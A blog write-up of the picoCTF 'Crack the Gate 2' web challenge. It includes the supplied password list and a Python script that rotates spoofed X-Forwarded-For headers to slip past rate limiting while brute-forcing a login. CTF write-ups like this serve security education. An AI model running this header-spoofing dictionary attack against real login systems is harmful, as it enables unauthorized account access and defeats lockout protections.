---
title: 'picoCTF Crack the Gate 2'
date: 2026-02-01
description: "In this writeup, I solve picoCTF's Crack the Gate 2 challenge by rotating IPs and bypassing rate-limit restriction to perform a dictionary attack."
author: 'Khashayar Khosrosourmi'
image:
    url: '/writeups/picoctf-crack-the-gate-2/thumbnail.png'
    alt: 'picoctf crack the gate 2 thumbnail'
tags: ["ctf", "web-exploitation", "rate-limiting", "dictionary-attack", "x-forwarded-for"]
---

## Challenge Description
The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: `ctf-player@picoctf.org` and uncover the hidden secret. The website is running here. Can you try to log in?. Download the passwords list here.

![Crack the gate screenshot 1](/writeups/picoctf-crack-the-gate-2/screenshot1.png)

## Hint 1
What IP does the server think you’re coming from?

## Hint 2
Read more about X-forwarded-For

## Hint 3
You can rotate fake IPs to bypass rate limits.

## passwords.txt

```
JiywhfQn
3zSd0XU0
50ylF3Uo
7XbIBfcQ
W4K0inBD
pSvOYV4a
MpNXnpfS
ZuylCpyS
bgl0SpNj
h2qf8Ppg
maSXnInx
iiidp7qG
enyDlwq8
P5gRbs2V
YrWWubgE
Gq7ZVFuD
Xpseyq9h
lVY5T9Ah
URgET2ph
6epBnWRf

```

## Solution
The challenge presents a login page similar to Crack the Gate 1 challenge, but the difference is that this challenge provides a .txt file containing passwords, and rate-limit restriction. To solve the challenge, I need to rotate IPs using `X-Forwarded-For` header to bypass rate-limit restriction.

![Crack the gate screenshot 1](/writeups/picoctf-crack-the-gate-2/screenshot2.png)

First I sent a login request with an arbitrary password and inspected the request inside my browser's developer tools network section to see the structure of the POST request body.

![Crack the gate screenshot 1](/writeups/picoctf-crack-the-gate-2/screenshot3.png)

Then using a python script, I read from the `passwords.txt` file and used IP rotation to work around the rate limiting implementation by the challenge. Here I used a for loop that rotates the last part of an arbitrary IP address from 0 to 19. Note that the URL I used was specific to my challenge instance.

```python

import requests

url = "http://amiable-citadel.picoctf.net:51963/login"

with open("passwords.txt", "r") as passfile:

    for i in range(20):
        password = passfile.readline().strip()

        headers = {"X-Forwarded-For": f"192.0.0.{i}"}

        res = requests.post(
            url,
            json={"email": "ctf-player@picoctf.org", "password": password},
            headers=headers,
        )

        print(res.status_code)
        print(password)
        print(res.json())
        print("_"*50)

```

The output of the script was:

![Crack the gate screenshot 1](/writeups/picoctf-crack-the-gate-2/screenshot4.png)

One of the passwords worked, and I successfully retrieved the flag.
